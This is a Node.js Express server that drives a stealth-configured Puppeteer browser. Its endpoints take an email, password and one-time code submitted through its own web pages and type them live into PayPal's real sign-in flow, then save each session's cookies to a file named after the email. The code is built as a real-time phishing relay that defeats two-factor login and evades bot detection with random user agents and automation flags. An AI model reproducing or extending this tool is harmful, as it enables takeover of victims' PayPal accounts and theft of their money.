const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { exec } = require('node:child_process');
const { promisify } = require('node:util');
const fs = require('fs');
const path = require('path');

puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Helper function for random delay
const randomDelay = (min = 200, max = 400) =>
    new Promise((resolve) => {
        const delayTime = Math.floor(Math.random() * (max - min + 1)) + min;
        setTimeout(resolve, delayTime);
    });

// Human-like typing function
const typeLikeHuman = async (page, selector, text) => {
    for (const char of text) {
        await page.type(selector, char);
        await randomDelay(100, 300);
    }
};

let puppeteerSession = {}; // Store Puppeteer data between steps

// Create a directory for storing cookies
const cookieDir = path.resolve(__dirname, 'cookie');
if (!fs.existsSync(cookieDir)) {
    fs.mkdirSync(cookieDir);
}

// List of user agents for bypassing CAPTCHA
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
];

// Helper function to get a random user agent
const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Launch Puppeteer Browser
const launchBrowser = async () => {
    const { stdout: chromiumPath } = await promisify(exec)('which chromium');

    if (!chromiumPath.trim()) {
        throw new Error('Chromium executable not found. Make sure it\'s installed.');
    }

    return puppeteer.launch({
        headless: false,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--start-maximized',
        ],
        executablePath: chromiumPath.trim(),
    });
};

// Save cookies to a file
const saveCookies = async (page, email) => {
    const cookies = await page.cookies();
    const filePath = path.join(cookieDir, `${email}.json`);
    fs.writeFileSync(filePath, JSON.stringify(cookies, null, 2));
};

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));  // Delay function

// Step 1: Email submission
app.post('/submit-step1', async (req, res) => {
    const { email } = req.body;
    if (!email) {
        return res.status(400).json({ success: false, message: 'Email is required' });
    }

    try {
        const browser = await launchBrowser();
        const page = await browser.newPage();

        puppeteerSession.browser = browser;
        puppeteerSession.page = page;
        puppeteerSession.email = email;

        const userAgent = getRandomUserAgent();
        await page.setUserAgent(userAgent);

        await page.goto('https://paypal.com/signin', { waitUntil: 'networkidle2' });
        await randomDelay();

        await typeLikeHuman(page, 'input[name="login_email"]', email);
        await randomDelay();

        await page.click('.button.actionContinue.scTrack\\:unifiedlogin-login-click-next');
        await randomDelay();

        await saveCookies(page, email);

        res.json({ success: true, message: 'Email submitted successfully!' });
    } catch (error) {
        console.error('Error in Step 1:', error);
        res.status(500).json({ success: false, message: 'Error submitting email' });
    }
});

app.post('/submit-step2', async (req, res) => {
    const { password } = req.body;
    const { page, email } = puppeteerSession;

    if (!password) {
        return res.status(400).json({ success: false, message: 'Password is required' });
    }

    if (!page || !email) {
        return res.status(500).json({ success: false, message: 'Session not found' });
    }

    try {
        // Step 2: Type the password and click "Continue"
        console.log('Typing password...');
        await typeLikeHuman(page, 'input#password', password);
        await randomDelay();

        console.log('Clicking the "Continue" button...');
        await Promise.all([
            page.click('.button.actionContinue.scTrack\\:unifiedlogin-login-submit'),
            page.waitForNavigation({ waitUntil: 'networkidle2' }) // Wait for navigation to complete
        ]);
        console.log('Navigation completed after "Continue".');

        // Step 2.1: Click the "Next" button on the new page
        const nextButtonSelector = 'button#challenge-submit-button';
        console.log('Waiting for "Next" button on the new page...');

        await page.waitForSelector(nextButtonSelector, { visible: true, timeout: 30000 });

        // Ensure button is interactable
        const isClickable = await page.evaluate((selector) => {
            const button = document.querySelector(selector);
            return button && !button.disabled && button.offsetParent !== null;
        }, nextButtonSelector);

        if (!isClickable) {
            console.error('"Next" button is not clickable.');
            return res.status(500).json({ success: false, message: '"Next" button is not clickable.' });
        }

        console.log('Clicking "Next" button...');
        await Promise.all([
            page.click(nextButtonSelector),
            page.waitForNavigation({ waitUntil: 'networkidle2' }) // Wait for navigation after clicking
        ]);
        console.log('"Next" button clicked and navigation completed.');

        // Save cookies for the session
        console.log('Saving cookies...');
        await saveCookies(page, email);

        res.json({ success: true, message: 'Password and "Next" button processed successfully!' });
    } catch (error) {
        console.error('Error in Step 2:', error);

        // Capture a screenshot for debugging
        await page.screenshot({ path: 'error-step2.png' });

        res.status(500).json({ success: false, message: 'Error submitting password and clicking "Next".' });
    }
});


// Step 3: OTP submission
app.post('/submit-step3', async (req, res) => {
    const { otp } = req.body;
    const { page, email } = puppeteerSession;

    if (!otp) {
        return res.status(400).json({ success: false, message: 'OTP is required' });
    }
    if (!page || !email) {
        return res.status(500).json({ success: false, message: 'Session not found' });
    }

    try {
        // Type each OTP digit into the corresponding field
        for (let i = 0; i < otp.length; i++) {
            const otpInputSelector = `input[name="otpCode-${i}"]`;
            await typeLikeHuman(page, otpInputSelector, otp[i]);
        }
        await randomDelay();

        await page.click('button#securityCodeSubmit');
        await randomDelay();

        await saveCookies(page, email);

        res.json({ success: true, message: 'OTP submitted successfully!' });
    } catch (error) {
        console.error('Error in Step 3:', error);
        res.status(500).json({ success: false, message: 'Error submitting OTP' });
    }
});

// Start the server
const port = 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
